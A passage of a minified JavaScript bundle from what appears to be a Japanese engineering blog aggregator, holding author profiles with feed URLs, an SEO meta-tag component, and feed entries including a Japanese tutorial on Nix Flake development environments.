"use strict";(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[736],{1202:(e,t,a)=>{a.d(t,{o:()=>o});let o=[{id:"yteraoka",name:"yteraoka",role:"SRE",bio:"ojisan",avatarSrc:"/avatars/yteraoka.jpeg",sources:["https://blog.1q77.com/index.xml","https://qiita.com/yteraoka/feed","https://medium.com/feed/@yteraoka","https://zenn.dev/yteraoka/feed"],includeUrlRegex:"",twitterUsername:"yteraoka",githubUsername:"yteraoka",websiteUrl:"https://blog.1q77.com/"},{id:"tozastation",name:"tozastation",role:"SRE",bio:"tarako_chan",avatarSrc:"/avatars/tozastation.jpg",sources:["https://qiita.com/tozastation/feed","https://tozastation.hashnode.dev/rss.xml","https://zenn.dev/tozastation/feed"],includeUrlRegex:"",twitterUsername:"tozastation",githubUsername:"tozastation",websiteUrl:"https://github.com/tozastation"},{id:"kyohmizu",name:"kyohmizu",role:"SRE",bio:"mizumoto",avatarSrc:"/avatars/kyohmizu.png",sources:["https://kyohmizu.hatenablog.com/feed","https://qiita.com/kyohmizu/feed","https://speakerdeck.com/kyohmizu.rss"],includeUrlRegex:"",twitterUsername:"kyohmizu",githubUsername:"kyohmizu",websiteUrl:"https://profile.kyohmizu.com/"},{id:"nwiizo",name:"nwiizo",role:"Software Developer",bio:"The Passionate Programmer",avatarSrc:"/avatars/nwiizo.jpeg",sources:["https://syu-m-5151.hatenablog.com/feed","https://zenn.dev/nwiizo/feed","https://speakerdeck.com/nwiizo.rss"],includeUrlRegex:"",twitterUsername:"nwiizo",githubUsername:"nwiizo",websiteUrl:"https://nwiizo.github.io/"},{id:"skikkh",name:"skikkh",role:"SRE",bio:"skikkh",avatarSrc:"/avatars/skikkh.jpeg",sources:["https://qiita.com/skikkh/feed"],includeUrlRegex:"",twitterUsername:"skikkh",githubUsername:"skikkh",websiteUrl:""},{id:"toshikish",name:"toshikish",role:"SRE",bio:"Toshiki Shimomura",avatarSrc:"/avatars/toshikish.png",sources:["https://toshikish.hateblo.jp/feed","https://zenn.dev/toshikish/feed","https://qiita.com/toshikish/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"toshikish",websiteUrl:""},{id:"Sreake",name:"Sreake",role:"",bio:"This Is The Sreake Section Blog.",avatarSrc:"/avatars/sreake.png",sources:["https://sreake.com/feed/"],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"SreakeJ",githubUsername:"",websiteUrl:"https://sreake.com"},{id:"Reckoner",name:"Reckoner",role:"",bio:"This Is The Reckoner Section Blog.",avatarSrc:"/avatars/reckoner.png",sources:[],includeUrlRegex:"blog",excludeUrlRegex:"event",twitterUsername:"reckoner_japan",githubUsername:"",websiteUrl:"https://reckoner.io/"},{id:"tez",name:"Takuya Tezuka",role:"JB",bio:"tez",avatarSrc:"/avatars/tezuka.jpeg",sources:["https://qiita.com/TT_Private/feed","https://speakerdeck.com/takuyatezuka.rss"],includeUrlRegex:"qiita.com/TT_Private",twitterUsername:"tt0603",githubUsername:"taku-tez",websiteUrl:"https://www.wantedly.com/id/takuya_tezuka"},{id:"sosan01",name:"Soichiro Tsuchida",role:"SRE",bio:"sosan",avatarSrc:"/avatars/sosan01.png",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"sosan01",websiteUrl:""},{id:"atsuya0",name:"Atsuya Tsukada",role:"SRE",bio:"human",avatarSrc:"/avatars/atsuya0.jpg",sources:["https://zenn.dev/tayusa/feed","https://qiita.com/atsuya0/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"atsuya0",websiteUrl:"https://github.com/atsuya0"},{id:"masasuzu",name:"SUZUKI, Masashi",role:"SRE",bio:"yasetai",avatarSrc:"/avatars/masasuzu.png",sources:["https://blog.masasuzu.net/feed","https://speakerdeck.com/masasuzu.rss"],includeUrlRegex:"",twitterUsername:"masasuz",githubUsername:"masasuzu",websiteUrl:"https://masasuzu.net"},{id:"kiyos",name:"Kyohei Saito",role:"SRE",bio:"haraheri",avatarSrc:"/avatars/kiyos.jpeg",sources:["https://zenn.dev/kyohei_saito/feed"],includeUrlRegex:"",twitterUsername:"kiyo_12_07",githubUsername:"kiyo-s",websiteUrl:""},{id:"mos914",name:"Yu Kaneko",role:"SRE",bio:"koke",avatarSrc:"/avatars/mos914.png",sources:["https://qiita.com/dirtymosschan/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"mos914",websiteUrl:""},{id:"unvavo",name:"nobu",role:"SRE",bio:"nobu",avatarSrc:"/avatars/nobu.png",sources:[],includeUrlRegex:"",twitterUsername:"unvavo",githubUsername:"unvavo",websiteUrl:""},{id:"hiroki-hasegawa",name:"長谷川 広樹",role:"なんらかのエンジニア",bio:"顔画像は著作権フリーですのでどうぞ",avatarSrc:"/avatars/hirokihasegawa.png",sources:["https://hiroki-hasegawa.hatenablog.jp/feed","https://speakerdeck.com/hiroki_hasegawa.rss"],includeUrlRegex:"",twitterUsername:"Hiroki__IT",githubUsername:"hiroki-it",websiteUrl:"https://hiroki-it.github.io/tech-notebook/"},{id:"kaisato",name:"Kai Sato",role:"SRE",bio:"domo",avatarSrc:"/avatars/kaisato.png",sources:[],includeUrlRegex:"",twitterUsername:"KAI21441756",githubUsername:"kaitexio",websiteUrl:""},{id:"ysakurai",name:"Yusuke Sakurai",role:"SRE",bio:"ysakurai",avatarSrc:"/avatars/ysakurai.jpg",sources:["https://qiita.com/ys1/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"saku3",websiteUrl:""},{id:"tayakun",name:"Soichiro Taya",role:"SRE",bio:"tayakun",avatarSrc:"/avatars/tayakun.png",sources:["https://qiita.com/tayakun/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"tayatamn",websiteUrl:""},{id:"SatohJohn",name:"SatohJohn",role:"Software Developer",bio:"SatohJohn",avatarSrc:"/avatars/satohjohn.png",sources:["https://qiita.com/satohjohn/feed","https://zenn.dev/satohjohn/feed"],includeUrlRegex:"",twitterUsername:"satohjohn",githubUsername:"satohjohn",websiteUrl:""},{id:"bayobayo0324",name:"bayobayo0324",role:"back/front/app Engineer",bio:"osake daisuki",avatarSrc:"/avatars/bayobayo0324.jpeg",sources:["https://qiita.com/bayobayo0324/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"bayobayo0324",websiteUrl:""},{id:"myamamoto",name:"myamamoto",role:"SRE",bio:"human",avatarSrc:"/avatars/myamamoto.jpeg",sources:["https://zenn.dev/ureuzy/feed"],includeUrlRegex:"",twitterUsername:"ureuzy",githubUsername:"ureuzy",websiteUrl:""},{id:"seno",name:"seno",role:"DBRE",bio:"seno",avatarSrc:"/avatars/seno.jpeg",sources:["https://zenn.dev/nedoko_dok0dko/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"senohirona",websiteUrl:""},{id:"sakama",name:"sakama",role:"SRE",bio:"homo sapiens",avatarSrc:"/avatars/sakama.jpeg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"junichiro-sakama",websiteUrl:""},{id:"stakamura",name:"Shohei Takamura",role:"SRE",bio:"SRE",avatarSrc:"/avatars/stakamura.jpg",sources:["https://zenn.dev/hakushou41/feed"],includeUrlRegex:"",twitterUsername:"hakushou41",githubUsername:"hakushou41",websiteUrl:""},{id:"toVersus",name:"Tsubasa Nagasawa",role:"SRE",bio:"lazy programmer",avatarSrc:"/avatars/toVersus.png",sources:["https://qiita.com/toVersus/feed","https://zenn.dev/toversus/feed"],includeUrlRegex:"",twitterUsername:"toversus26",githubUsername:"toVersus",websiteUrl:""},{id:"raba-jp",name:"Hiroki Sakuraba",role:"Software Developer",bio:"meow",avatarSrc:"/avatars/raba-jp.jpg",sources:["https://zenn.dev/raba_jp/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"raba-jp",websiteUrl:""},{id:"ixsakra",name:"Ryosuke Sakurai",role:"SRE",bio:"ganbarumasu 'w'",avatarSrc:"/avatars/ixsakra.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"nnaka2992",name:"NAKADATE Naoki",role:"DBRE",bio:"what on the earth is Database?",avatarSrc:"/avatars/nnaka2992.jpg",sources:["https://nnaka2992.hatenablog.com/feed","https://zenn.dev/nnaka2992/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://nnaka2992.hatenablog.com/"},{id:"satoken",name:"satoken",role:"SRE",bio:"",avatarSrc:"/avatars/satoken.jpg",sources:[],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:""},{id:"bells17",name:"bells17",role:"Software Engineer",bio:"Software Engineer",avatarSrc:"/avatars/bells17.jpeg",sources:["https://zenn.dev/bells17/feed","https://medium.com/feed/@bells17","https://speakerdeck.com/bells17.rss"],includeUrlRegex:"",twitterUsername:"bells17_",githubUsername:"bells17",websiteUrl:"https://bells17.io/"},{id:"hide-1",name:"Shuichi Inoue",role:"long-term internship student",bio:"I want to become a strong engineer :)",avatarSrc:"/avatars/hide-1.jpg",sources:["https://sreake.com/blog/config-connectortest/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt/feed","https://sreake.com/blog/kubernetes-operation-with-chatgpt4/feed","https://sreake.com/blog/chatgpt-slack-integration/feed"],includeUrlRegex:"",twitterUsername:"19MU50",githubUsername:"hide-1",websiteUrl:""},{id:"yuu0w0yuu",name:"Yutaro Shirayama",role:"SRE",bio:"( ˘ω˘ )",avatarSrc:"/avatars/shirayama.jpg",sources:["https://zenn.dev/yuu0w0yuu/feed"],includeUrlRegex:"",twitterUsername:"yuu0w0yuu",githubUsername:"yuu0w0yuu",websiteUrl:""},{id:"gawingowin",name:"Araki Shogo",role:"long-term internship student",bio:"born 2 be engineer",avatarSrc:"/avatars/araki-icon.jpg",sources:[],includeUrlRegex:"",twitterUsername:"GawinGowin",githubUsername:"GawinGowin",websiteUrl:""},{id:"nomadblacky",name:"Takumi Kadowaki",role:"Software Engineer @ Reckoner",bio:"Scala / Observability",avatarSrc:"/avatars/nomadblacky.jpg",sources:["https://zenn.dev/nomadblacky/feed","https://speakerdeck.com/nomadblacky.rss"],includeUrlRegex:"",twitterUsername:"nomadblacky",githubUsername:"NomadBlacky",websiteUrl:""},{id:"kobuchi",name:"Shu Kobuchi",role:"Software Developer",bio:"mammalian",avatarSrc:"/avatars/kobuchi.jpeg",sources:["https://shu-kob.hateblo.jp/feed","https://speakerdeck.com/shukob.rss"],includeUrlRegex:"",twitterUsername:"shu_kob",githubUsername:"shu-kob",websiteUrl:""},{id:"kojake_300",name:"Yuki Iwasaki",role:"SRE",bio:"Splatoon",avatarSrc:"/avatars/yuki_iwasaki.png",sources:["https://qiita.com/kojake_300/feed","https://zenn.dev/kojake_300/feed","https://speakerdeck.com/kojake_300.rss"],includeUrlRegex:"",twitterUsername:"kojake_300",githubUsername:"",websiteUrl:""},{id:"kurita",name:"Kurita Keigo",role:"long-term internship student",bio:"I want to enginner the reliablity of the site",avatarSrc:"/avatars/kurita.jpg",sources:["https://kechigon.hatenablog.com/feed"],includeUrlRegex:"",twitterUsername:"kechigongon",githubUsername:"kechigon",websiteUrl:"https://www.wantedly.com/id/keigo_kurita_e"},{id:"masaru-komiyama",name:"masaru-komiyama",role:"SRE",bio:"SRE",avatarSrc:"/avatars/komiyama5380.jpg",sources:["https://qiita.com/masaru-komiyama/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"",websiteUrl:"https://qiita.com/masaru-komiyama/"},{id:"moz-sec",name:"Kobayashi Shun",role:"long-term internship student",bio:"I am a graduate student in Kyoto",avatarSrc:"/avatars/kobayashi.png",sources:["https://moz-security.hatenablog.com/feed","https://zenn.dev/moz_sec/feed","https://speakerdeck.com/moz_sec_.rss"],includeUrlRegex:"",twitterUsername:"moz_sec_",githubUsername:"moz-sec",websiteUrl:"https://moz-sec.com/"},{id:"yyamada",name:"Yunosuke Yamada",avatarSrc:"/avatars/yyamada.jpg",role:"Full Stack Engineer",bio:"筋トレ / LLM / Webアプリケーション",sources:["https://zenn.dev/kimitsu/feed","https://speakerdeck.com/yunosukey.rss"],githubUsername:"YunosukeY",twitterUsername:"east_k1mitsu",websiteUrl:"https://linktr.ee/kimitsu"},{id:"k-nagase",name:"Kohei Nagase",avatarSrc:"/avatars/koheinagase.jpg",role:"SRE",bio:"YANIKASU",sources:["https://zenn.dev/k_nagase/feed"],githubUsername:"k-ngs",twitterUsername:"koh_naga",websiteUrl:""},{id:"iota",name:"Itaru Ota",avatarSrc:"/avatars/iota.jpg",role:"Full Stack Engineer",bio:"A.R.E.",sources:["https://zenn.dev/iorandd/feed","https://speakerdeck.com/ota1022.rss"],githubUsername:"Ota1022",twitterUsername:"iorandd",websiteUrl:"https://ota1022.github.io/"},{id:"kamono",name:"Makoto Kamono",avatarSrc:"/avatars/kamono.jpg",role:"SRE",bio:"kamo dayo~",sources:["https://zenn.dev/kamos/feed"],githubUsername:"Mkamono",twitterUsername:"duckend_pg",websiteUrl:""},{id:"akagawa",name:"Daisuke Akagawa",avatarSrc:"/avatars/akagawa.png",role:"Full Stack Engineer",bio:"Akasan",sources:["https://zenn.dev/akasan/feed","https://medium.com/feed/@daisuke1024akagawa"],githubUsername:"Akasan",twitterUsername:"",websiteUrl:""},{id:"kugimiya",name:"Daichi Kugimiya",avatarSrc:"/avatars/kugimiya.jpeg",role:"Full Stack Engineer",bio:"Kugimiya",sources:["https://zenn.dev/meziron/feed"],githubUsername:"daikugimiya0715",twitterUsername:"abimaruXD",websiteUrl:""},{id:"matsuura",name:"Yushin Matsuura",avatarSrc:"/avatars/matsuura.png",role:"Full Stack Engineer",bio:"Matsuura",sources:["https://qiita.com/m_pig/feed"],githubUsername:"you-matsuura",twitterUsername:"yuu_matsu_yuu",websiteUrl:"https://qiita.com/m_pig"},{id:"silasolla",name:"Masaki Haga",avatarSrc:"/avatars/silasolla.png",role:"Full Stack Engineer",bio:"Trust, but verify.",sources:["https://zenn.dev/silasolla/feed","https://silasol.la/rss/tech.xml"],githubUsername:"silasolla",twitterUsername:"silasolla",websiteUrl:"https://silasol.la"},{id:"amine",name:"Amine Ilidrissi",avatarSrc:"/avatars/amine.jpeg",role:"Full Stack Application Engineer",bio:"Writing about Laravel, Astro, and whatever happens on the job",sources:["https://qiita.com/aminevg/feed","https://speakerdeck.com/aminevg.rss"],githubUsername:"aminevg",twitterUsername:"realaminevg",websiteUrl:""},{id:"reito",name:"Reito Koike",role:"SRE",bio:"curiosity-driven SRE",avatarSrc:"/avatars/reito.png",sources:["https://zenn.dev/r4ynode/feed","https://qiita.com/r4ynode/feed"],includeUrlRegex:"",twitterUsername:"r4ynode",githubUsername:"r4ynode",websiteUrl:""},{id:"riiim",name:"riiim",role:"Engineer",bio:"Engineer",avatarSrc:"/avatars/riiim.png",sources:["http://rowicy.com/RiiiM/rss.xml"],includeUrlRegex:"",twitterUsername:"riiim400th",githubUsername:"riiim400th",websiteUrl:"https://www.rowicy.com/blog/"},{id:"sraku",name:"Sota Nakano",role:"SRE",bio:"sraku",avatarSrc:"/avatars/sraku.jpg",sources:["https://zenn.dev/sraku/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"sraku2159",websiteUrl:""},{id:"takehiro1111",name:"takehiro1111",role:"Engineer",bio:"takehiro1111",avatarSrc:"/avatars/takehiro1111.jpg",sources:["https://zenn.dev/takehiro1111/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"takehiro1111",websiteUrl:""},{id:"ayibote",name:"ayibote",role:"Infrastructure Engineer",bio:"",avatarSrc:"/avatars/ayibote.jpg",sources:["https://dev.mix64.com/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"mix64",websiteUrl:""},{id:"yutaf11",name:"Yuta Fujii",role:"Engineer",bio:"(  ˙-˙  )",avatarSrc:"/avatars/yfujii.png",sources:["https://qiita.com/yutaf11/feed"],includeUrlRegex:"",twitterUsername:"",githubUsername:"pogepoge9",websiteUrl:""}].sort((e,t)=>e.id<t.id?-1:1)},4003:(e,t,a)=>{a.d(t,{t:()=>s});var o=a(7876),i=a(7328),r=a.n(i),n=a(9348);let s=e=>{let{path:t,title:a,description:i,ogImageUrl:s,noindex:c,removeSiteNameFromTitle:l}=e,u="".concat(n.$.siteRoot).concat(t||"");return(0,o.jsxs)(r(),{children:[(0,o.jsx)("title",{children:l?a:"".concat(a," | ").concat(n.$.siteMeta.title)}),(0,o.jsx)("meta",{property:"og:title",content:a}),(0,o.jsx)("meta",{property:"og:url",content:u}),(0,o.jsx)("meta",{name:"twitter:card",content:"summary_large_image"}),(0,o.jsx)("meta",{property:"og:site",content:n.$.siteMeta.title}),(0,o.jsx)("meta",{property:"og:image",content:s||"".concat(n.$.siteRoot,"/og.png")}),!!i&&(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)("meta",{name:"description",content:i}),(0,o.jsx)("meta",{property:"og:description",content:i})]}),t&&(0,o.jsx)("link",{rel:"canonical",href:u}),c&&(0,o.jsx)("meta",{name:"robots",content:"noindex"})]})}},6067:e=>{e.exports=JSON.parse('[{"title":"My Plans of how to spend the New Year’s holiday from 2025 to 2026","link":"https://daisuke1024akagawa.medium.com/my-plans-of-how-to-spend-the-new-years-holiday-from-2025-to-2026-588104d21f71?source=rss-c54ac439ad2b------2","isoDate":"2025-12-18T13:10:41.000Z","dateMiliSeconds":1766063441000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Apache Commons Numbersとはなんなのか？","link":"https://zenn.dev/akasan/articles/apache_commons_numbers","contentSnippet":"今回はApache Commons Numbersについて調べてみました。 今回も以下のツールを使って対象プロジェクトを決めました！https://zenn.dev/akasan/articles/7e30ad266c02c4※ 本企画に関する記事の目的は、それぞれのプロジェクトを本格的に深ぼるのではなく、プロジェクト名⇆どんな内容かをパッと思い出せるようにすることを目指します！※ とはいえ深ぼってみたいプロジェクトがあればどんどん複数連載になると思います。 Apache Commons Numbersとは？公式サイトによると、Apache Commons Numbers...","isoDate":"2025-12-18T11:18:57.000Z","dateMiliSeconds":1766056737000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Apache Commons Chainとはなんなのか？","link":"https://zenn.dev/akasan/articles/apache_commons_chain","contentSnippet":"今回は、Apache Commons Chainについて調べてみました。今回も以下のツールを使って対象プロジェクトを決めました！https://zenn.dev/akasan/articles/7e30ad266c02c4※ 本企画に関する記事の目的は、それぞれのプロジェクトを本格的に深ぼるのではなく、プロジェクト名⇆どんな内容かをパッと思い出せるようにすることを目指します！※ とはいえ深ぼってみたいプロジェクトがあればどんどん複数連載になると思います。 Apache Commons Chainとは？公式サイトによると、Gang of Fourの責任連鎖パターン(chain ...","isoDate":"2025-12-18T11:18:56.000Z","dateMiliSeconds":1766056736000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Apache Causewayとはなんなのか？","link":"https://zenn.dev/akasan/articles/apache_causeway_intro","contentSnippet":"今回は、Apache Causeway。今回も以下のツールを使って対象プロジェクトを決めました！https://zenn.dev/akasan/articles/7e30ad266c02c4※ 本企画に関する記事の目的は、それぞれのプロジェクトを本格的に深ぼるのではなく、プロジェクト名⇆どんな内容かをパッと思い出せるようにすることを目指します！※ とはいえ深ぼってみたいプロジェクトがあればどんどん複数連載になると思います。 Apache Causewayとは？公式サイトによると、Apache Causeway™ enables domain-driven applicat...","isoDate":"2025-12-18T11:18:56.000Z","dateMiliSeconds":1766056736000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Apache Avroとはなんなのか？","link":"https://zenn.dev/akasan/articles/apache_avro_serialization","contentSnippet":"今回は、Apache Avro（以下、Avro）について調べてみました。今回も以下のツールを使って対象プロジェクトを決めました！https://zenn.dev/akasan/articles/7e30ad266c02c4※ 本企画に関する記事の目的は、それぞれのプロジェクトを本格的に深ぼるのではなく、プロジェクト名⇆どんな内容かをパッと思い出せるようにすることを目指します！※ とはいえ深ぼってみたいプロジェクトがあればどんどん複数連載になると思います。 Avroとは？公式サイトによると、Apache Avro™ is the leading serialization ...","isoDate":"2025-12-18T11:18:55.000Z","dateMiliSeconds":1766056735000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"「自分の環境では動く」から解放される Nix Flake ","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/18/111500","contentSnippet":"はじめに「自分の環境では動くんだけど...」という言葉を、何度聞いたことがあるだろうか。開発環境の差異は、これまで「手順書」「Docker」「asdf/anyenv」で解決を試みてきたが、いずれも時間経過で破綻する。手順書は陳腐化し、Dockerfileのベースイメージは変わり、asdfは言語ごとにツールが分散する。問題の本質は「環境の固定」ではなく「依存関係の完全な追跡」にあった。これを根本から解決するのが、純粋関数型パッケージマネージャ「Nix」と、その最新機能「Nix Flake」だ。これらの課題感については Infrastructure as Code, 3rd Edition が詳しく論じており、参考になる。2025年 俺が愛した本たち 技術書編 に入れれていなくて悲しいほどよい書籍である。オライリー・ジャパンさん 自分は翻訳の準備できてます！！！Infrastructure as Code: Designing and Delivering Dynamic Systems for the Cloud Age (English Edition)作者:Morris, KiefO\'Reilly MediaAmazon本記事では、Nix Flake を使った開発環境の統一について、Docker との比較を交えながら包括的に解説する。実際に複数言語のプロジェクトで検証した結果も含めて、実践的な導入方法を紹介する。この記事で分かることNix Flake の基本概念と従来の Nix との違いDocker と Nix の使い分け・組み合わせ方各プログラミング言語（Rust, Go, Python, TypeScript）での開発環境の構築方法CI/CD との統合方法と direnv による自動環境切り替えNix とは何か純粋関数型パッケージマネージャNix は、従来のパッケージマネージャ（apt, brew, npm など）とは根本的に異なるアプローチを取る。その核心は「純粋関数型」（入力が同じなら出力も必ず同じになる仕組み）という概念にある。数学の関数と同様に、Nix では「同じ入力からは常に同じ出力が得られる」。パッケージのビルドに必要な全ての依存関係を明示的に指定し、外部環境に依存しない閉じた環境でビルドを行う。この仕組みにより、以下が保証される。再現性: 誰がいつどこでビルドしても、同じ結果が得られる分離性: システムの既存環境を汚さない共存性: 同じパッケージの異なるバージョンが同時に存在できるnixos.orgハッシュベースの依存管理Nix は全てのパッケージを /nix/store/ 以下にハッシュ付きで保存する。例えば、Node.js 20.10.0 は以下のようなパスに保存される。/nix/store/abc123...-nodejs-20.10.0/このハッシュは、パッケージのソースコード、ビルドスクリプト、全ての依存関係から計算される。つまり、依存関係が少しでも異なれば、異なるハッシュ（異なるパス）になる。これにより、バージョン競合が原理的に発生しない。Nix の核心概念Nix を理解するには、いくつかの重要な概念を押さえておく必要がある。Derivation（導出）Derivation はビルドレシピのようなもので、Nix の中核概念だ。「既存の store object から新しい store object を生成する純粋関数」と捉えれば理解しやすい。ビルドは sandboxed プロセスとして実行され、指定された入力のみを読み込み、決定論的に出力を生成する。Store（ストア）Store は /nix/store/ に存在するオブジェクトの集合だ。全てのパッケージ、ビルド成果物、依存関係がここに保存される。Store は不変（immutable）であり、一度書き込まれたオブジェクトは変更されない。Store PathStore path は store object の一意な識別子だ。例えば以下のような形式になる。/nix/store/a040m110amc4h71lds2jmr8qrkj2jhxd-git-2.38.1この長い文字列（a040m110...）は、パッケージの全ての入力から計算されたハッシュだ。入力が変われば、パスも変わる。これが Nix の再現性を支える基盤となっている。Realise（実現化）Realise は derivation を実際にビルドし、store path を valid な状態にすることだ。既にキャッシュにあればダウンロードされ、なければビルドが実行される。これらの概念については、公式マニュアルと用語集で詳しく解説されている。nix.devnix.devNix Flake とはFlake の基本構造Nix Flake は、Nix の最新機能であり、プロジェクトの依存関係を宣言的に管理する仕組みだ。従来の Nix には2つの問題があった。(1) NIX_PATH や <nixpkgs> などグローバルな状態に依存し、マシンごとに異なる結果を生む可能性があった。(2) 依存関係のバージョンを固定する標準的な方法を欠いていた。nix-channel の更新で環境が変わってしまうのだ。Flake は flake.lock でこれらを解決する。project/├── flake.nix          # プロジェクト定義├── flake.lock         # 依存関係のロックファイル└── src/               # ソースコードflake.nix は以下の構造を持つ。{  description = \\"プロジェクトの説明\\";  inputs = {    # 依存する外部 Flake を定義    nixpkgs.url = \\"github:nixos/nixpkgs?ref=nixpkgs-unstable\\";  };  outputs = { self, nixpkgs }: {    # 出力（devShells, packages, etc.）を定義  };}flake.lock による再現性flake.lock は npm の package-lock.json や Rust の Cargo.lock に相当する。全ての依存関係のコミットハッシュが固定されるため、時間が経っても同じ環境を再現できる。{  \\"nodes\\": {    \\"nixpkgs\\": {      \\"locked\\": {        \\"lastModified\\": 1702312524,        \\"narHash\\": \\"sha256-...\\",        \\"rev\\": \\"abc123...\\",        \\"type\\": \\"github\\"      }    }  }}Flake についての詳細は NixOS Wiki を参照してほしい。nixos.wikiDocker / コンテナエコシステムとの比較Nix と Docker は競合ではなく補完関係にある。Nix は「ビルド時の再現性」を、Docker は「ランタイムの分離とデプロイ」を担う。各ツールとの関係 ツール  役割  Nix との関係  Dockerfile  イメージビルド  Nix で置き換え可能（より再現性が高い）  Docker Compose  マルチコンテナ構成  devenv/process-compose で補完  Kubernetes  コンテナオーケストレーション  Nixidy/kubenix で統合可能  Helm  K8s パッケージ管理  nix-helm で Nix から利用可能  Skaffold  開発ワークフロー自動化  ビルドフェーズで Nix を使用可能 Dockerfile の課題と Nix の解決策Dockerfile は広く普及しているが、再現性に課題がある。# Dockerfile: 再現性の問題FROM python:3.12  # タグは可変RUN apt-get update && apt-get install -y curl  # バージョン固定なしRUN pip install requests  # バージョン固定なし# Nix: 完全な再現性{  packages.docker-image = pkgs.dockerTools.buildImage {    name = \\"my-app\\";    copyToRoot = pkgs.buildEnv {      name = \\"image-root\\";      paths = [ pkgs.python312 pkgs.curl pkgs.python312Packages.requests ];    };  };}Nix の優位点:- ビット単位で同一の結果を保証- 全ての依存を明示的に管理（暗黙の依存が混入しない）- パッケージ単位の効率的なキャッシュ- SBOM（Software Bill of Materials）の自動生成blog.replit.comwww.devzero.ioNix + Docker の組み合わせ両者を組み合わせることで「再現可能なビルド」と「ポータブルなデプロイ」を両立できる。{  packages.docker-image = pkgs.dockerTools.buildLayeredImage {    name = \\"my-app\\";    tag = \\"latest\\";    contents = [ myApp pkgs.cacert ];    config.Cmd = [ \\"/bin/my-app\\" ];  };}各依存パッケージが独立したレイヤーになるため、パッケージAを更新してもパッケージBのレイヤーは再利用される。Dockerfile を書く必要がなく、Nix の宣言的な記述で完結する。flox.devKubernetes との統合: NixidyNixidy は Nix と Argo CD を組み合わせた GitOps ツールで、クラスター全体を NixOS のように管理できる。{  applications.nginx = {    namespace = \\"default\\";    helm.releases.nginx = {      chart = inputs.nixhelm.chartsDerivations.nginx;      values = { replicaCount = 3; service.type = \\"LoadBalancer\\"; };    };  };}nixidy.dev近年、ソフトウェアサプライチェーンのセキュリティが重視されている。ビルドの再現性と依存関係の透明性は「必須」になりつつある。Nix はビルドプロセス全体を宣言的に記述するため、SBOM の自動生成と来歴の追跡が容易だ。thenewstack.io実践：複数言語での開発環境構築flake-parts によるモジュール化複雑な Flake を管理しやすくするために、flake-parts を使う。これは NixOS モジュールシステムの考え方を Flake に適用したもので、設定を複数ファイルに分割できる。{  inputs = {    nixpkgs.url = \\"github:nixos/nixpkgs?ref=nixpkgs-unstable\\";    flake-parts.url = \\"github:hercules-ci/flake-parts\\";    treefmt-nix.url = \\"github:numtide/treefmt-nix\\";  };  outputs = { flake-parts, ... }@inputs:    flake-parts.lib.mkFlake { inherit inputs; } {      imports = [ inputs.treefmt-nix.flakeModule ];      systems = [ \\"aarch64-darwin\\" \\"aarch64-linux\\" \\"x86_64-linux\\" ];      perSystem = { config, pkgs, ... }: {        devShells.default = pkgs.mkShell {          packages = with pkgs; [            nodejs_22            config.treefmt.build.wrapper          ];        };        treefmt = {          projectRootFile = \\"flake.nix\\";          programs.prettier.enable = true;          programs.nixfmt.enable = true;        };      };    };}flake.partsRust 開発環境Rust プロジェクトでは、rust-overlay を使う。rustupなしで stable/nightly を切り替えられる。rust-analyzer や clippy も flake.nix で宣言的に管理できる。{  inputs.rust-overlay.url = \\"github:oxalica/rust-overlay\\";  perSystem = { pkgs, system, ... }:    let      overlayPkgs = import inputs.nixpkgs {        inherit system;        overlays = [ inputs.rust-overlay.overlays.default ];      };      rustToolchain = overlayPkgs.rust-bin.stable.latest.default.override {        extensions = [ \\"rust-src\\" \\"rust-analyzer\\" \\"clippy\\" ];      };    in {      devShells.default = pkgs.mkShell {        packages = [          rustToolchain          pkgs.cargo-watch          pkgs.cargo-edit        ];      };    };}github.comGo 開発環境{  devShells.default = pkgs.mkShell {    packages = with pkgs; [      go      golangci-lint      gopls      delve    ];    env = {      CGO_ENABLED = \\"0\\";    };  };}Python 開発環境Python では uv との組み合わせを推奨する。Nix で Python 本体と uv を提供し、パッケージ管理は uv に任せる。pyenv/venv/pip の組み合わせより高速で、依存解決も確実だ。{  devShells.default = pkgs.mkShell {    packages = with pkgs; [      python312      uv      ruff      pyright    ];    env = {      UV_PROJECT_ENVIRONMENT = \\".venv\\";    };  };}マルチ言語プロジェクト1つの Flake で複数の開発環境を提供できる。{  devShells = {    default = pkgs.mkShell {      packages = [ rustToolchain pkgs.go pkgs.nodejs_22 ];    };    rust = pkgs.mkShell { packages = [ rustToolchain ]; };    go = pkgs.mkShell { packages = [ pkgs.go ]; };    nodejs = pkgs.mkShell { packages = [ pkgs.nodejs_22 ]; };  };}使用時は以下のように選択できる。nix develop        # デフォルト（全言語）nix develop .#rust # Rust のみnix develop .#go   # Go のみ様々な言語向けのテンプレートが dev-templates リポジトリで公開されている。github.comdirenv との連携direnv とはdirenv は、ディレクトリごとに環境変数を自動で切り替えるツールだ。.envrc ファイルを配置したディレクトリに入ると自動的に環境がロードされ、離れるとアンロードされる。direnv.netnix-direnv のセットアップNix Flake と direnv を連携させるには、nix-direnv が必要だ。実際にセットアップした手順を紹介する。1. nix-direnv のインストール# Nix profile でインストールnix profile 